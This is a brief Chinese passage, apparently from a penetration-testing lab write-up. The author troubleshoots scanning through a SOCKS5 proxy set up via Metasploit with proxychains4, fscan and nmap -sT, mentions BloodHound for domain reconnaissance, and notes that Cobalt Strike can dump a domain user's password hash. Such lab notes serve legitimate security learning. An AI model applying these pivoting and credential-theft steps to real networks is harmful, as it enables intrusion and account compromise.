还有就是不明白搭建了`socks5`的代理服务器，使用`proxychains4 fscan` 以及`proxychains4 nmap`的操作依旧探测不了主机，`nmap`我也执行使用`-sT` 使用`TCP`来探测，难道是`MSF`代理的问题吗？

还有本来想用BloodHound来手机信息，展现更多工具用法，但是…

![image.png](image%2068.png)

关于域用户`admin` ，使用`CS`可以抓取其`HASH`